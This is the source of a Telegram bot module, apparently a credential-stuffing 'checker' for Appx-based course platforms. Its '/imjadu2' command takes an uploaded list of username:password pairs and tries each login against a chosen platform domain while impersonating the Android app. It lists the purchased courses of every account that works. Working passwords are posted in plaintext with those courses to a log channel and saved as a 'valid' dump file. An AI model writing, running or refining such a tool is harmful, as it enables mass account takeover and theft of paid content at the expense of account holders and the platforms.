import asyncio
import requests
from Extractor import app
from pyrogram import filters
from asyncio import Lock
from config import PREMIUM_LOGS

# ================= CONFIG =================
LOG_CHANNEL_ID = PREMIUM_LOGS
SEM = asyncio.Semaphore(5)

# ================= GLOBAL STATE =================
stats = {
    "checked": 0,
    "valid": 0,
    "invalid": 0,
    "total": 0
}

stats_lock = Lock()
results = []

# ================= HELPERS =================
def post_request(url, headers, data):
    return requests.post(url, headers=headers, data=data, timeout=15)

def get_request(url, headers):
    return requests.get(url, headers=headers, timeout=15)

def extract_api_name(api: str) -> str:
    api = api.replace("https://", "").replace("http://", "")
    return api.split(".")[0]

def progress_bar(done, total, size=16):
    if total == 0:
        return "[░░░░░░░░░░░░░░░░] 0%"
    filled = int(size * done / total)
    percent = int((done / total) * 100)
    return f"[{'█' * filled}{'░' * (size - filled)}] {percent}%"

# ================= CORE FUNCTION =================
async def login_and_get_courses(n, p, api, bot, progress_msg):
    async with SEM:
        h = {
            "client-service": "Appx",
            "auth-key": "appxapi",
            "user-id": "-2",
            "language": "en",
            "device_type": "ANDROID",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "okhttp/4.9.1"
        }

        d = {
            "email": n,
            "password": p,
            "devicetoken": "",
            "mydeviceid": "b9ed63e5d2a"
        }

        loop = asyncio.get_running_loop()

        # -------- LOGIN --------
        try:
            r1 = await loop.run_in_executor(
                None, post_request, f"https://{api}/post/userLogin", h, d
            )
            r1 = r1.json()
        except Exception:
            async with stats_lock:
                stats["checked"] += 1
                stats["invalid"] += 1
            return

        # 🔒 SAFETY CHECK
        if not isinstance(r1, dict):
            async with stats_lock:
                stats["checked"] += 1
                stats["invalid"] += 1
            return

        data = r1.get("data")
        if not isinstance(data, dict) or not data.get("token"):
            async with stats_lock:
                stats["checked"] += 1
                stats["invalid"] += 1
            return

        h["authorization"] = data["token"]

        # -------- COURSES --------
        try:
            r2 = await loop.run_in_executor(
                None, get_request, f"https://{api}/get/mycourseweb?userid=", h
            )
            r2 = r2.json()
        except Exception:
            async with stats_lock:
                stats["checked"] += 1
                stats["invalid"] += 1
            return

        if not isinstance(r2, dict) or not isinstance(r2.get("data"), list):
            async with stats_lock:
                stats["checked"] += 1
                stats["invalid"] += 1
            return

        # ================= SUCCESS =================
        batches = [
            i.get("course_name")
            for i in r2["data"]
            if isinstance(i, dict) and i.get("course_name")
        ]

        if not batches:
            async with stats_lock:
                stats["checked"] += 1
                stats["invalid"] += 1
            return

        success_text = f"🔥 {n}*{p}\n"
        for b in batches:
            success_text += f"📦 {b}\n"

        await bot.send_message(LOG_CHANNEL_ID, success_text)
        results.append(success_text)

        async with stats_lock:
            stats["checked"] += 1
            stats["valid"] += 1

        remaining = stats["total"] - stats["checked"]
        bar = progress_bar(stats["checked"], stats["total"])

        await progress_msg.edit_text(
            f"{bar}\n\n"
            f"🔄 Checked: {stats['checked']}\n"
            f"✅ Valid: {stats['valid']}\n"
            f"❌ Invalid: {stats['invalid']}\n"
            f"⏳ Remaining: {remaining}"
        )

# ================= COMMAND =================
@app.on_message(filters.command("imjadu2"))
async def pw_command_handler(bot, m):
    cfile = await bot.ask(
        m.chat.id,
        "📄 Upload credential file (`username:password` per line)"
    )

    file_path = await bot.download_media(cfile.document.file_id)

    appx = await bot.ask(
        m.chat.id,
        "🌐 Enter Appx API domain (without https://)"
    )
    api = appx.text.strip()

    with open(file_path, "r") as f:
        lines = [i.strip() for i in f if ":" in i]

    stats["total"] = len(lines)
    stats["checked"] = stats["valid"] = stats["invalid"] = 0
    results.clear()

    progress_msg = await m.reply_text(
        f"{progress_bar(0, stats['total'])}\n\n"
        f"🔄 Checked: 0\n"
        f"✅ Valid: 0\n"
        f"❌ Invalid: 0\n"
        f"⏳ Remaining: {stats['total']}"
    )

    tasks = []
    for line in lines:
        n, p = line.split(":", 1)
        tasks.append(login_and_get_courses(n, p, api, bot, progress_msg))

    await asyncio.gather(*tasks)

    # ================= FINAL TXT =================
    api_name = extract_api_name(api)
    txt_path = f"valid_{api_name}.txt"

    with open(txt_path, "w", encoding="utf-8") as f:
        f.write("\n\n".join(results))

    await m.reply_document(txt_path, caption="📄 Final Valid Results")
    await bot.send_document(LOG_CHANNEL_ID, txt_path, caption="📄 Full Valid Dump")
